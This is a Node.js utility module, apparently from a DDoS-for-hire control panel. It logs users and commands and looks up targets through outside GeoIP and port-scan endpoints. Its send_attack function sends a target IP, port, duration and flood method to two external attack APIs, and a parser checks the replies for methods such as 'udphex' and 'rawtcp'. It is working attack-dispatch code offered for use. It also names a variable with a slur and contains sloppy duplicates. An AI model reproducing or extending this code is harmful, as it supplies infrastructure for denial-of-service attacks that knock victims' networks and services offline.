// Modules 
const fs = require("fs");
const fetch = require("node-fetch");

// File
const eExtra = require("./functions.js");
const Crud = require("../Auth/crud.js");
const Config = require("../Config/main.js");
const eConfig = require("../Config/current.js");

/*
*@type: void
*/
exports.sleep = (milliseconds) => {
    return new Promise(resolve => setTimeout(resolve, milliseconds))
}

/*
*@params: Log Type, Username, IP Address
*@type: [<string>]
*/
exports.log_action = function(log_type, user, ip) {
    /*
    Get user info
    */

    let get_user = Crud.User(user);
    let info = get_user.split(",");

    let response = "[LOG]: " + log_type + " | [Timestamp]: " + eExtra.currentTime() + "\r\n";
    response += "[User]: " + user + " | [IP]: " + ip + "\r\n";
    response += "[Level]: " + info[3] + " | [Admin]: " + info[5] + "\r\n";
    response += "[Cmd]: " + eConfig.CurrentCmd.Cmd + " | [FullCmd]: " + eConfig.CurrentCmd.Fullcmd + "\r\n\r\n";
    console.log(response);
    eExtra.log_to_file(response);
}

/*
*@param: output
*@type: void
*/
exports.log_to_file = function(output) {
    fs.appendFileSync("../db/sys/logs.db", output);
}

exports.log_attack = function(user, ip, port, time, method) {

}

/*
*@params: IP Address
*@type: [<string>]
*/
exports.GeoIP = async function(ip) {
    let results = await(await fetch("https://scrapy.tech/geo.php?ip="+ ip)).text();
    return results;
}

/*
*@params: IP Address
*@type: [<string>]
*/
exports.pScan = async function(ip) {
    let results = await(await fetch("https://scrapy.tech/pscan.php?ip="+ ip)).text();
    return results;
}

/*
*@type: void
*/
exports.currentTime = function() {
    let current = new Date();
    let gay = current.getMonth()+1 + "/" + current.getDate() + "/" + current.getFullYear();
    return gay;
}

/*
*@params: time
*@type: (Promise[void])
*/
exports.sleep = function(time) {
    return new Promise((resolve) => setTimeout(resolve, time));
}

/*
*@params: Row, Column, Socket
*@type: (Promise[void])
*/
exports.set_cursor = function(row, column, socket) {
    socket.write("\033[" + row + ";" + column + "f");
}

/*
*@params: Row, Column, Socket
*@type: (Promise[void])
*/
exports.set_TerminalSize = function(row, col, socket) {
    socket.write("\033[8;" + row + ";" + col + "t");
    // socket.write("\033[8;40;81t");
}

/*
*@type: (Promise[void])
*/
exports.set_Title = function(t, socket) {
    socket.write("\033]0;" + t + "\007");
}

/*
*@params: IP Adress, Port, Time, Method
*@type: (Promise[<string>])
*/
exports.send_attack = async function(ip, port, time, method, usr) {
    let response = "";
    
    let rreturn = await(await fetch(Config.API_1 + ip + "&port=" + port + "&time=" + time + "&type=" + method)).text();
    console.log(rreturn);
    response += "API 1: " + await eExtra.get_api_response(rreturn) + "\r\n";
    
    let rreturn1 = await(await fetch(Config.API_2 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
    console.log(rreturn1);
    response += "API 1: " + await eExtra.get_api_response(rreturn1) + "\r\n";

    return response;
}

/*
*@params: Response
*@type: (Promise[<string>])
*/
exports.get_api_response = function(rpn) {
    let new_res = rpn.toLowerCase();
    if(new_res.includes("attack sent") || new_res.includes("udphex") || new_res.includes("std") || new_res.includes("rawtcp") || new_res.includes("attack initalized")) {
        return "Attack Sent";
    } else if(new_res.includes("invalid key") || new_res.includes("key is invalid")) {
        return "Error, Invalid Key";
    } else if(new_res.includes("invalid method") || new_res.includes("method is invalid") || new_res.includes("method does not exist") || new_res.includes("method doesn't exist")) {
        return "Error, Invalid Method";
    } else if(new_res.includes("error when connecting to the server if the problem")) { //CUSTOM (REMOVE LATER)
        return "Error, Either all fields aren't set or invalid method!";
    } else {
        return "Error, Something went wrong catching attack response!";
    }
}